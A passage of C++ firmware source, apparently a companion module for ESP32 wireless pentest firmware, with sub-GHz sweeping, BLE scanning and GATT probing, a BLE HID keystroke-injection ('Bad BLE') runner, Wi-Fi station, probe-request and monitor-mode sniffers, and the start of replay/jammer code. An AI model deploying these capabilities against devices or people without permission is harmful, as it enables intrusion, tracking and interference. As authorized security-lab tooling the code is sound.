    if (fStart <= 0) fStart = 300.0f;
    if (fEnd <= 0) fEnd = 348.0f;
    if (fEnd < fStart) { float t = fStart; fStart = fEnd; fEnd = t; }
    if (fStep < 0.01f) fStep = 1.0f;
    int count = (int)((fEnd - fStart) / fStep) + 1;
    if (count < 1) count = 1;
    // Keep the point count within one frame; widen the step if the range is too fine.
    if (count > SPEC_MAX) {
        count = SPEC_MAX;
        fStep = (fEnd - fStart) / (float)(count - 1 > 0 ? count - 1 : 1);
    }
    if (!initRfModule("rx", fStart)) return; // CC1101 not found -> stay off (caps already report it)
    ELECHOUSE_cc1101.setRxBW(200);
    specFStart = fStart;
    specFStep = fStep;
    specCount = count;
    specIdx = 0;
    subSpec = true;
}

static void subghzSpecStop() {
    if (!subSpec) return;
    subSpec = false;
    deinitRfModule();
}

static void subghzSpecService() {
    if (!subSpec) return;
    // Sweep a bounded chunk of steps this call (non-blocking).
    for (int n = 0; n < SPEC_CHUNK && specIdx < specCount; n++, specIdx++) {
        float f = specFStart + specIdx * specFStep;
        setMHZ(f);
        // T-Embed shares the CC1101 SPI bus with the TFT: a dummy TFT write + extra settle time
        // keeps the bus happy (same workaround as rf_waterfall_run()).
        if (bruceConfigPins.CC1101_bus.mosi == TFT_MOSI) {
            tft.drawPixel(0, 0, 0);
            delayMicroseconds(150);
        } else {
            delayMicroseconds(100);
        }
        int rssi = ELECHOUSE_cc1101.getRssi();
        if (bruceConfigPins.CC1101_bus.mosi == TFT_MOSI) tft.drawPixel(0, 0, 0);
        specRssi[specIdx] = (int16_t)rssi;
    }
    if (specIdx >= specCount) {
        JsonDocument out;
        beginEnvelope(out, MSG_EVENT, 0);
        JsonObject d = out["d"].to<JsonObject>();
        d["ev"] = "subghz.spectrum";
        JsonObject data = d["data"].to<JsonObject>();
        data["start"] = (uint32_t)(specFStart * 1000.0f); // kHz
        data["step"] = (uint32_t)(specFStep * 1000.0f);   // kHz
        data["count"] = specCount;
        JsonArray r = data["rssi"].to<JsonArray>();
        for (int i = 0; i < specCount; i++) r.add(specRssi[i]);
        sendEnvelope(out);
        specIdx = 0; // keep sweeping continuously while the stream is on
    }
}
#endif // COMPANION_HAS_CC1101

// --- BLE scan stream: the ESP scans, the phone lists/dedups/analyzes. ---

static bool subBle = false;
static NimBLEScan *bleScan = nullptr;

static void bleStart() {
    if (subBle) return;
    NimBLEDevice::init("");
    bleScan = NimBLEDevice::getScan();
    if (bleScan) bleScan->setActiveScan(true);
    subBle = true;
}

static void bleStop() {
    if (!subBle) return;
    subBle = false;
    bleScan = nullptr;
    NimBLEDevice::deinit(true);
}

static void bleService() {
    if (!subBle || bleScan == nullptr) return;
    // Short blocking window (called every loop iteration) so ESC, PING and the other streams
    // are serviced ~3x/second instead of being starved for 2s each scan.
    NimBLEScanResults results = bleScan->getResults(350, false);
    int n = results.getCount();
    for (int i = 0; i < n; i++) {
        const NimBLEAdvertisedDevice *dev = results.getDevice(i);
        if (dev == nullptr) continue;
        JsonDocument out;
        beginEnvelope(out, MSG_EVENT, 0);
        JsonObject d = out["d"].to<JsonObject>();
        d["ev"] = "ble.dev";
        JsonObject data = d["data"].to<JsonObject>();
        data["mac"] = String(dev->getAddress().toString().c_str());
        data["name"] = String(dev->getName().c_str());
        data["rssi"] = dev->getRSSI();
        sendEnvelope(out);
    }
    bleScan->clearResults();
}

// --- Brucia BLE GATT explorer (BLE central) ---------------------------------------
// Connect to a peripheral by MAC, walk its GATT table, read a characteristic. NimBLE
// is always compiled in, so no board macro is needed. These share the single BLE
// controller with the ble.scan stream, so each op stops the scan first (bleStop) and
// the phone re-subscribes ble.scan afterwards if it still wants the stream.
// AUTHORIZED / LAB USE ONLY: only probe devices you own or are permitted to test.

// Open a client to <mac>. We only have the MAC string, not its address type, so we
// try public then random. Returns a connected client or nullptr. Bounded by an 8s
// connect timeout per attempt.
static NimBLEClient *gattOpen(const String &macArg) {
    String mac = macArg;
    mac.trim();
    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
    const uint8_t types[2] = {BLE_ADDR_PUBLIC, BLE_ADDR_RANDOM};
    for (int t = 0; t < 2; t++) {
        NimBLEClient *client = NimBLEDevice::createClient();
        if (!client) return nullptr;
        client->setConnectTimeout(8000); // ms
        NimBLEAddress addr(std::string(mac.c_str()), types[t]);
        if (client->connect(addr)) return client;
        NimBLEDevice::deleteClient(client);
    }
    return nullptr;
}

static void gattClose(NimBLEClient *client) {
    if (!client) return;
    if (client->isConnected()) client->disconnect();
    NimBLEDevice::deleteClient(client);
}

// ble_gatt_connect <mac> : discover every service + characteristic and stream one
// EVENT ev="ble.gatt" data { svc, chr, props:"rwWnib" } per characteristic, then
// ACK { ok, out:"discovered <s> services, <c> characteristics" }. Disconnects after.
static void runBleGattConnect(const String &args, uint32_t id) {
    String mac = args;
    mac.trim();
    if (mac.length() < 11) {
        sendErr(id, 400, "usage: ble_gatt_connect <mac>");
        return;
    }
    if (subBle) bleStop(); // shared controller: stop the scan stream for the op
    NimBLEClient *client = gattOpen(mac);
    if (!client) {
        companionAckMsg(id, false, "connect failed");
        return;
    }
    int nsvc = 0, nchr = 0;
    const std::vector<NimBLERemoteService *> &svcs = client->getServices(true);
    for (auto *svc : svcs) {
        if (!svc) continue;
        nsvc++;
        String su = String(svc->getUUID().toString().c_str());
        const std::vector<NimBLERemoteCharacteristic *> &chrs = svc->getCharacteristics(true);
        for (auto *chr : chrs) {
            if (!chr) continue;
            nchr++;
            char props[8];
            int pi = 0;
            if (chr->canRead()) props[pi++] = 'r';
            if (chr->canWrite()) props[pi++] = 'w';
            if (chr->canWriteNoResponse()) props[pi++] = 'W';
            if (chr->canNotify()) props[pi++] = 'n';
            if (chr->canIndicate()) props[pi++] = 'i';
            if (chr->canBroadcast()) props[pi++] = 'b';
            props[pi] = 0;
            JsonDocument out;
            beginEnvelope(out, MSG_EVENT, 0);
            JsonObject d = out["d"].to<JsonObject>();
            d["ev"] = "ble.gatt";
            JsonObject data = d["data"].to<JsonObject>();
            data["svc"] = su;
            data["chr"] = String(chr->getUUID().toString().c_str());
            data["props"] = props;
            sendEnvelope(out);
        }
    }
    gattClose(client);
    String outMsg = "discovered " + String(nsvc) + " services, " + String(nchr) + " characteristics";
    companionAckMsg(id, true, outMsg.c_str());
}

// ble_gatt_read <mac> <char_uuid> : connect, find the characteristic across all
// services, read it, and ACK { ok, out:"hex=<..> text=<..>" } (text only when the
// value is printable ASCII).
static void runBleGattRead(const String &args, uint32_t id) {
    String a = args;
    a.trim();
    int sp = a.indexOf(' ');
    if (sp < 0) {
        sendErr(id, 400, "usage: ble_gatt_read <mac> <char_uuid>");
        return;
    }
    String mac = a.substring(0, sp);
    mac.trim();
    String cu = a.substring(sp + 1);
    cu.trim();
    if (mac.length() < 11 || cu.length() == 0) {
        sendErr(id, 400, "usage: ble_gatt_read <mac> <char_uuid>");
        return;
    }
    if (subBle) bleStop();
    NimBLEClient *client = gattOpen(mac);
    if (!client) {
        companionAckMsg(id, false, "connect failed");
        return;
    }
    NimBLEUUID target(std::string(cu.c_str()));
    NimBLERemoteCharacteristic *found = nullptr;
    const std::vector<NimBLERemoteService *> &svcs = client->getServices(true);
    for (auto *svc : svcs) {
        if (!svc) continue;
        NimBLERemoteCharacteristic *c = svc->getCharacteristic(target);
        if (c) {
            found = c;
            break;
        }
    }
    if (!found) {
        gattClose(client);
        companionAckMsg(id, false, "characteristic not found");
        return;
    }
    if (!found->canRead()) {
        gattClose(client);
        companionAckMsg(id, false, "characteristic not readable");
        return;
    }
    NimBLEAttValue val = found->readValue();
    const uint8_t *p = val.data();
    size_t n = val.length();
    String hex;
    hex.reserve(n * 2);
    String txt;
    txt.reserve(n);
    static const char *HEXD = "0123456789abcdef";
    bool printable = n > 0;
    for (size_t i = 0; i < n; i++) {
        hex += HEXD[p[i] >> 4];
        hex += HEXD[p[i] & 0xF];
        if (p[i] >= 0x20 && p[i] <= 0x7e) txt += (char)p[i];
        else printable = false;
    }
    gattClose(client);
    String outMsg = "hex=" + (n ? hex : String("(empty)"));
    if (printable) outMsg += " text=" + txt;
    companionAckMsg(id, true, outMsg.c_str());
}

#if !defined(LITE_VERSION)
// --- Brucia Bad BLE (Ducky over BLE HID): headless, bounded runner ----------------
// Advertises the device as a BLE HID keyboard (reusing Bruce's ducky_typer BLE path:
// ducky_startKb -> key_input), waits a bounded window for a host to pair, then types
// the phone-supplied Ducky/BadUSB script (STRING, DELAY, ENTER, GUI, ... handled by
// the existing Ducky parser in key_input). ACK { ok, out:"ran <n> lines" }.
// AUTHORIZED / LAB USE ONLY: only run against hosts you own or are permitted to test.
static void runBleBadble(const String &script, uint32_t id) {
    String s = script;
    s.replace("\r\n", "\n");
    if (s.length() == 0) {
        sendErr(id, 400, "usage: ble_badble <ducky script text>");
        return;
    }
    if (subBle) bleStop(); // shared controller: scan and the HID keyboard are exclusive

    // Stage the script in PSRAM-backed FS so we can reuse key_input(FS, path, hid).
    if (!_setupPsramFs()) {
        companionAckMsg(id, false, "psram fs init failed");
        return;
    }
    const String tmp = "/badble.txt";
    File f = PSRamFS.open(tmp, FILE_WRITE);
    if (!f) {
        companionAckMsg(id, false, "temp script open failed");
        return;
    }
    f.write((const uint8_t *)s.c_str(), s.length());
    f.close();

    // Count non-empty lines for the ACK (the parser skips blank lines the same way).
    int lines = 0;
    int len = s.length();
    for (int from = 0; from <= len;) {
        int nl = s.indexOf('\n', from);
        String ln = (nl < 0) ? s.substring(from) : s.substring(from, nl);
        ln.trim();
        if (ln.length() > 0) lines++;
        if (nl < 0) break;
        from = nl + 1;
    }

    // Bring up the BLE HID keyboard and advertise (functionId 2 = BadUSB).
    safeCleanupDuckyBLE(hid_ble);
    ducky_startKb(hid_ble, true, 2);
    if (returnToMenu || hid_ble == nullptr) {
        returnToMenu = false;
        safeCleanupDuckyBLE(hid_ble);
        PSRamFS.remove(tmp);
        companionAckMsg(id, false, "ble hid init failed (low RAM?)");
        return;
    }

    // Bounded wait (30s) for a host to pair; abortable on-device with ESC.
    const uint32_t deadline = millis() + 30000;
    while (!hid_ble->isConnected() && (int32_t)(millis() - deadline) < 0) {
        if (check(EscPress)) break;
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    if (!hid_ble->isConnected()) {
        safeCleanupDuckyBLE(hid_ble);
        PSRamFS.remove(tmp);
        companionAckMsg(id, false, "no host paired within 30s");
        return;
    }
    BLEConnected = true;
    delay(500); // let the host finish HID setup before the first keystroke

    key_input(PSRamFS, tmp, hid_ble);

    safeCleanupDuckyBLE(hid_ble);
    PSRamFS.remove(tmp);
    BLEConnected = false;

    String out = "ran " + String(lines) + " lines";
    companionAckMsg(id, true, out.c_str());
}
#endif // !LITE_VERSION

// --- wifi.sta stream: headless station/client sniffer (promiscuous, channel-hopping).
//     Reports devices (stations) and the BSSID they talk to; the phone lists/dedups them.
//     Mutually exclusive with the wifi.ap scan stream (both want the WiFi radio). ---
struct StaHit {
    uint8_t mac[6];
    uint8_t bssid[6];
    int8_t rssi;
};
static volatile bool staSniff = false;
static StaHit staRing[48];
static volatile uint8_t staHead = 0;
static volatile uint8_t staTail = 0;
static uint8_t staChannel = 1;
static uint32_t staLastHop = 0;

static void staSnifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!staSniff) return;
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (!pkt || pkt->rx_ctrl.sig_len < 24) return;
    const uint8_t *p = pkt->payload; // 802.11 header: addr1@4, addr2@10, addr3@16
    uint8_t next = (uint8_t)((staHead + 1) % 48);
    if (next == staTail) return; // ring full, drop
    StaHit &h = staRing[staHead];
    memcpy(h.mac, p + 10, 6);   // addr2 = transmitter (station)
    memcpy(h.bssid, p + 16, 6); // addr3 = BSSID
    h.rssi = (int8_t)pkt->rx_ctrl.rssi;
    staHead = next;
}

static void staStart() {
    if (staSniff) return;
    ensureWifiPlatform();
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt = {};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(staSnifferCb);
    staChannel = 1;
    esp_wifi_set_channel(staChannel, WIFI_SECOND_CHAN_NONE);
    staHead = 0;
    staTail = 0;
    staLastHop = millis();
    staSniff = true;
}

static void staStop() {
    if (!staSniff) return;
    staSniff = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
}

static void staService() {
    if (!staSniff) return;
    if (millis() - staLastHop > 280) { // hop 2.4GHz channels so we see the whole band
        staChannel = (uint8_t)((staChannel % 13) + 1);
        esp_wifi_set_channel(staChannel, WIFI_SECOND_CHAN_NONE);
        staLastHop = millis();
    }
    int n = 0;
    while (staTail != staHead && n < 20) {
        StaHit h = staRing[staTail];
        staTail = (uint8_t)((staTail + 1) % 48);
        n++;
        char mac[18], bssid[18];
        snprintf(
            mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X", h.mac[0], h.mac[1], h.mac[2],
            h.mac[3], h.mac[4], h.mac[5]
        );
        snprintf(
            bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X", h.bssid[0], h.bssid[1],
            h.bssid[2], h.bssid[3], h.bssid[4], h.bssid[5]
        );
        JsonDocument out;
        beginEnvelope(out, MSG_EVENT, 0);
        JsonObject d = out["d"].to<JsonObject>();
        d["ev"] = "wifi.sta";
        JsonObject data = d["data"].to<JsonObject>();
        data["mac"] = mac;
        data["bssid"] = bssid;
        data["rssi"] = h.rssi;
        data["ch"] = staChannel;
        sendEnvelope(out);
    }
}

// --- wifi.probe stream: headless 802.11 PROBE REQUEST profiler (promiscuous, channel-hopping).
//     Parses management frames of type 0 / subtype 4 to extract the client MAC (addr2) and the
//     requested SSID (from the SSID information element at the start of the frame body), plus RSSI.
//     Streams EVENT ev="wifi.probe" data { mac, ssid, rssi, ch }. Built on the same promiscuous +
//     channel-hop scaffolding as the wifi.sta sniffer above (staStart/staSnifferCb). Shares the
//     Wi-Fi radio, so it is mutually exclusive with wifi.ap and wifi.sta. ---
struct ProbeHit {
    uint8_t mac[6];
    char ssid[33]; // max SSID is 32 bytes + NUL
    int8_t rssi;
};
static volatile bool probeSniff = false;
static ProbeHit probeRing[32];
static volatile uint8_t probeHead = 0;
static volatile uint8_t probeTail = 0;
static uint8_t probeChannel = 1;
static uint32_t probeLastHop = 0;

static void probeSnifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!probeSniff) return;
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (!pkt || pkt->rx_ctrl.sig_len < 24) return;
    const uint8_t *p = pkt->payload;
    // 802.11 frame control byte 0: bits 2-3 = type, bits 4-7 = subtype. Probe request = type 0
    // (management), subtype 4.
    uint8_t fc = p[0];
    if (((fc >> 2) & 0x03) != 0x00 || ((fc >> 4) & 0x0F) != 0x04) return;
    uint8_t next = (uint8_t)((probeHead + 1) % 32);
    if (next == probeTail) return; // ring full, drop
    ProbeHit &h = probeRing[probeHead];
    memcpy(h.mac, p + 10, 6); // addr2 = transmitter (the probing client)
    h.rssi = (int8_t)pkt->rx_ctrl.rssi;
    // Frame body starts at offset 24 (no QoS/HT-control in a probe request). The first tagged
    // parameter is the SSID IE: [tag id = 0][length][SSID bytes]. An empty length = wildcard probe.
    h.ssid[0] = '\0';
    const int body = 24;
    if (pkt->rx_ctrl.sig_len >= body + 2 && p[body] == 0x00) {
        uint8_t len = p[body + 1];
        if (len > 32) len = 32;
        if (len > 0 && pkt->rx_ctrl.sig_len >= body + 2 + len) {
            memcpy(h.ssid, p + body + 2, len);
            h.ssid[len] = '\0';
        }
    }
    probeHead = next;
}

static void probeStart() {
    if (probeSniff) return;
    ensureWifiPlatform();
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt = {};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT; // only management frames (probe requests)
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(probeSnifferCb);
    probeChannel = 1;
    esp_wifi_set_channel(probeChannel, WIFI_SECOND_CHAN_NONE);
    probeHead = 0;
    probeTail = 0;
    probeLastHop = millis();
    probeSniff = true;
}

static void probeStop() {
    if (!probeSniff) return;
    probeSniff = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
}

static void probeService() {
    if (!probeSniff) return;
    if (millis() - probeLastHop > 280) { // hop 2.4GHz channels so we see probes on the whole band
        probeChannel = (uint8_t)((probeChannel % 13) + 1);
        esp_wifi_set_channel(probeChannel, WIFI_SECOND_CHAN_NONE);
        probeLastHop = millis();
    }
    int n = 0;
    while (probeTail != probeHead && n < 20) {
        ProbeHit h = probeRing[probeTail];
        probeTail = (uint8_t)((probeTail + 1) % 32);
        n++;
        char mac[18];
        snprintf(
            mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X", h.mac[0], h.mac[1], h.mac[2],
            h.mac[3], h.mac[4], h.mac[5]
        );
        JsonDocument out;
        beginEnvelope(out, MSG_EVENT, 0);
        JsonObject d = out["d"].to<JsonObject>();
        d["ev"] = "wifi.probe";
        JsonObject data = d["data"].to<JsonObject>();
        data["mac"] = mac;
        data["ssid"] = h.ssid; // empty string = wildcard / broadcast probe
        data["rssi"] = h.rssi;
        data["ch"] = probeChannel;
        sendEnvelope(out);
    }
}

// --- file pull: stream an SD file to the phone as base64 DATA frames. ---

static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static String b64encode(const uint8_t *d, size_t n) {
    String o;
    o.reserve((n + 2) / 3 * 4);
    size_t i = 0;
    while (i + 3 <= n) {
        uint32_t v = ((uint32_t)d[i] << 16) | ((uint32_t)d[i + 1] << 8) | d[i + 2];
        o += B64[(v >> 18) & 63]; o += B64[(v >> 12) & 63]; o += B64[(v >> 6) & 63]; o += B64[v & 63];
        i += 3;
    }
    size_t rem = n - i;
    if (rem == 1) {
        uint32_t v = (uint32_t)d[i] << 16;
        o += B64[(v >> 18) & 63]; o += B64[(v >> 12) & 63]; o += "==";
    } else if (rem == 2) {
        uint32_t v = ((uint32_t)d[i] << 16) | ((uint32_t)d[i + 1] << 8);
        o += B64[(v >> 18) & 63]; o += B64[(v >> 12) & 63]; o += B64[(v >> 6) & 63]; o += "=";
    }
    return o;
}

// Base64 DECODE into a malloc'd buffer (caller frees). Used by the audio paths that
// carry PCM phone->device: fm_audio_data and spkr_pcm_data. Kept at file scope (not
// inside an FM/speaker guard) so either path can decode regardless of which audio
// hardware a board has.
static int companionB64val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1; // '=', whitespace/newlines and any stray char are skipped
}

static uint8_t *companionB64decode(const String &in, size_t *outLen) {
    int n = in.length();
    uint8_t *out = (uint8_t *)malloc((size_t)(n / 4) * 3 + 3);
    if (!out) {
        *outLen = 0;
        return nullptr;
    }
    int acc = 0, bits = 0;
    size_t o = 0;
    for (int i = 0; i < n; i++) {
        char c = in[i];
        if (c == '=') break;
        int v = companionB64val(c);
        if (v < 0) continue;
        acc = (acc << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[o++] = (uint8_t)((acc >> bits) & 0xFF);
        }
    }
    *outLen = o;
    if (o == 0) {
        free(out);
        return nullptr;
    }
    return out;
}

// --- wifi.monitor stream: full 802.11 monitor-mode (promiscuous) capture. Streams every
//     captured frame to the phone as base64 so it can assemble a PCAP (whole-network
//     over-the-air capture a phone cannot do on its own). Built on the same promiscuous
//     scaffolding as the wifi.sta sniffer (esp_wifi promiscuous + ISR-safe ring buffer),
//     but keeps the RAW bytes of each frame instead of parsed fields.
//
//     SUB { stream:"wifi.monitor", on, [channel], [bssid] }:
//       - channel given  -> LOCK to it (no hop): the "watch my own AP" case.
//       - channel absent -> slow-hop 2.4 GHz to see the whole band.
//       - bssid given    -> only frames to/from that BSSID (addr1/addr2/addr3) are kept.
//     EVENT ev="wifi.monitor" data { ts:<micros>, ch:<n>, rssi:<dBm>, len:<n>, data:"<b64>" }.
//     Shares the Wi-Fi radio -> mutually exclusive with wifi.ap / wifi.sta / wifi.probe. ---
#define MON_MAX_FRAME 512 // cap captured bytes per frame (first 512) to keep the USB stream up
#define MON_RING 12       // ring depth; drop on overflow (each slot holds up to MON_MAX_FRAME)
struct MonHit {
    uint32_t ts;
    int8_t rssi;
    uint8_t ch;
    uint16_t len;
    uint8_t data[MON_MAX_FRAME];
};
static volatile bool monSniff = false;
static MonHit monRing[MON_RING];
static volatile uint8_t monHead = 0;
static volatile uint8_t monTail = 0;
static uint8_t monChannel = 1;
static bool monLockChannel = false; // true = stay on monChannel (no hop)
static uint32_t monLastHop = 0;
static bool monBssidFilter = false;
static uint8_t monBssid[6] = {0};

static void monSnifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!monSniff) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (!pkt || pkt->rx_ctrl.sig_len < 10) return;
    const uint8_t *p = pkt->payload;
    uint16_t sig = pkt->rx_ctrl.sig_len;
    // Optional BSSID filter: keep only frames where addr1/addr2/addr3 matches (needs a full
    // MAC-addressed header; control frames shorter than 24 bytes are dropped when filtering).
    if (monBssidFilter) {
        if (sig < 24) return;
        if (memcmp(p + 4, monBssid, 6) != 0 && memcmp(p + 10, monBssid, 6) != 0 &&
            memcmp(p + 16, monBssid, 6) != 0)
            return;
    }
    uint8_t next = (uint8_t)((monHead + 1) % MON_RING);
    if (next == monTail) return; // ring full, drop
    MonHit &h = monRing[monHead];
    uint16_t len = sig > MON_MAX_FRAME ? MON_MAX_FRAME : sig; // cap frame size
    memcpy(h.data, p, len);
    h.len = len;
    h.ts = micros();
    h.rssi = (int8_t)pkt->rx_ctrl.rssi;
    h.ch = monChannel;
    monHead = next;
}

static void monStart(int channel, const char *bssidStr) {
    if (monSniff) return;
    ensureWifiPlatform();
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt = {};
    // Capture everything over the air: management, data and control frames.
    filt.filter_mask =
        WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_CTRL;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(monSnifferCb);
    // Optional BSSID filter.
    monBssidFilter = false;
    if (bssidStr && bssidStr[0]) {
        String b(bssidStr);
        b.replace(":", "");
        b.trim();
        if (b.length() == 12) {
            for (int i = 0; i < 6; i++)
                monBssid[i] = (uint8_t)strtoul(b.substring(i * 2, i * 2 + 2).c_str(), nullptr, 16);
            monBssidFilter = true;
        }
    }
    // Channel: lock to the requested one, or start a slow hop from channel 1.
    if (channel >= 1 && channel <= 14) {
        monChannel = (uint8_t)channel;
        monLockChannel = true;
    } else {
        monChannel = 1;
        monLockChannel = false;
    }
    esp_wifi_set_channel(monChannel, WIFI_SECOND_CHAN_NONE);
    monHead = 0;
    monTail = 0;
    monLastHop = millis();
    monSniff = true;
}

static void monStop() {
    if (!monSniff) return;
    monSniff = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    monBssidFilter = false;
}

static void monService() {
    if (!monSniff) return;
    // Slow-hop the 2.4 GHz band unless locked to a channel (the "watch my AP" case).
    if (!monLockChannel && millis() - monLastHop > 400) {
        monChannel = (uint8_t)((monChannel % 13) + 1);
        esp_wifi_set_channel(monChannel, WIFI_SECOND_CHAN_NONE);
        monLastHop = millis();
    }
    // Drain a bounded number of frames per service call so the USB stream keeps up.
    int n = 0;
    while (monTail != monHead && n < 6) {
        const MonHit &h = monRing[monTail];
        JsonDocument out;
        beginEnvelope(out, MSG_EVENT, 0);
        JsonObject d = out["d"].to<JsonObject>();
        d["ev"] = "wifi.monitor";
        JsonObject data = d["data"].to<JsonObject>();
        data["ts"] = h.ts;
        data["ch"] = h.ch;
        data["rssi"] = h.rssi;
        data["len"] = h.len;
        data["data"] = b64encode(h.data, h.len);
        sendEnvelope(out);
        monTail = (uint8_t)((monTail + 1) % MON_RING);
        n++;
    }
}

static void fsReadStream(const String &pathIn, uint32_t id) {
    FS *fs;
    if (!getFsStorage(fs)) { sendErr(id, 404, "no storage"); return; }
    String path = pathIn;
    path.trim();
    if (!path.startsWith("/")) path = "/" + path;
    File f = (*fs).open(path, FILE_READ);
    if (!f) { sendErr(id, 404, "open failed"); return; }
    uint8_t buf[768];
    uint32_t seq = 0;
    uint32_t total = 0;
    while (f.available()) {
        int n = f.read(buf, sizeof(buf));
        if (n <= 0) break;
        total += n;
        JsonDocument out;
        beginEnvelope(out, MSG_DATA, 0);
        JsonObject d = out["d"].to<JsonObject>();
        d["stream"] = "file";
        d["seq"] = seq++;
        d["chunk"] = b64encode(buf, n);
        sendEnvelope(out);
    }
    f.close();
    JsonDocument o;
    beginEnvelope(o, MSG_ACK, id);
    JsonObject d = o["d"].to<JsonObject>();
    d["ok"] = true;
    d["size"] = total;
    sendEnvelope(o);
}

// fs_write <path> <base64>        : create/overwrite (truncate) a file with the decoded bytes.
// fs_write_append <path> <base64> : open the file for append and add the decoded bytes.
// Base64 is used so arbitrary/binary content survives the JSON/CLI channel (reusing the
// file-scope companionB64decode()). Picks the FS the same way fs_read does (SD if available,
// else LittleFS; errors if neither). One write per frame (the whole CMD already fits within
// COMPANION_MAX_FRAME); to push a larger file the app streams it as a first fs_write
// (truncate) followed by repeated fs_write_append chunks. ACK { ok, size:<bytes written> };
// sendErr on bad base64, too-large payload, no storage or open/write failure.
static void fsWriteCmd(const String &args, uint32_t id, bool append) {
    const char *usage = append ? "usage: fs_write_append <path> <base64>" : "usage: fs_write <path> <base64>";
    String a = args;
    a.trim();
    int sp = a.indexOf(' ');
    if (sp < 0) {
        sendErr(id, 400, usage);
        return;
    }
    String path = a.substring(0, sp);
    path.trim();
    String b64 = a.substring(sp + 1);
    b64.trim();
    if (path.length() == 0 || b64.length() == 0) {
        sendErr(id, 400, usage);
        return;
    }
    FS *fs;
    if (!getFsStorage(fs)) {
        sendErr(id, 404, "no storage");
        return;
    }
    if (!path.startsWith("/")) path = "/" + path;

    size_t outLen = 0;
    uint8_t *data = companionB64decode(b64, &outLen);
    if (!data || outLen == 0) {
        if (data) free(data);
        sendErr(id, 400, "bad base64");
        return;
    }
    if (outLen > COMPANION_MAX_FRAME) { // one fs_write per frame
        free(data);
        sendErr(id, 413, "payload too large");
        return;
    }
    File f = (*fs).open(path, append ? FILE_APPEND : FILE_WRITE);
    if (!f) {
        free(data);
        sendErr(id, 500, "open failed");
        return;
    }
    size_t wrote = f.write(data, outLen);
    f.close();
    free(data);
    if (wrote != outLen) {
        sendErr(id, 500, "write failed");
        return;
    }
    JsonDocument o;
    beginEnvelope(o, MSG_ACK, id);
    JsonObject d = o["d"].to<JsonObject>();
    d["ok"] = true;
    d["size"] = (uint32_t)wrote;
    sendEnvelope(o);
}

// ---------------------------------------------------------------------------
// Brucia Sub-GHz companion commands (replay / tx-raw / jammer / config).
// All require a CC1101 over SPI; boards without one still LINK and reply 501.
// ---------------------------------------------------------------------------
#if defined(COMPANION_HAS_CC1101)
// In-memory RF config shared by the Sub-GHz companion commands. subghz_config
// writes it; subsequent capture (replay) applies the modulation/bandwidth/data
// rate after bringing the module up, and the frequency doubles as the default
// when a command is given 0. Frequency is also mirrored into bruceConfigPins so
// the reused record/emit/jammer paths (which read bruceConfigPins.rfFreq) agree.
struct CompanionRfCfg {
    float freqMHz = 433.92f;
    uint8_t modulation = 2; // 0 = 2-FSK, 2 = ASK/OOK (CC1101 setModulation values)
    float rxBW = 256.0f;    // kHz
    float dataRate = 50.0f; // kBaud
};
static CompanionRfCfg g_rfCfg;

static const char *modName(uint8_t m) { return m == 0 ? "2-FSK" : "OOK"; }

// Headless raw-OOK capture into a RawRecording, reusing the RMT RX path from
// modules/rf/record.cpp (setup_rf_rx + rmt_receive) and the companion ISR
// callback. Accumulates every signal (>=5 symbols) seen within durationMs, with
// inter-signal gaps, exactly as rf_raw_record_create() would, so the result can
// be handed straight to rf_raw_emit(). Returns the total edge count captured.
static size_t subghzCaptureRaw(float freqMHz, uint32_t durationMs, RawRecording &rec) {
    rec.frequency = freqMHz;
    if (!initRfModule("rx", freqMHz)) return 0;
    // Apply the in-memory config so capture honours subghz_config (initRfModule
    // resets these to generic scan defaults, so set them afterwards).
    ELECHOUSE_cc1101.setModulation(g_rfCfg.modulation);
    ELECHOUSE_cc1101.setRxBW(g_rfCfg.rxBW);
    ELECHOUSE_cc1101.setDRate(g_rfCfg.dataRate);
    ELECHOUSE_cc1101.SetRx();

    rmt_channel_handle_t rx = setup_rf_rx();
    if (rx == nullptr) {
        deinitRfModule();
        return 0;
    }
    QueueHandle_t q = xQueueCreate(4, sizeof(rmt_rx_done_event_data_t));
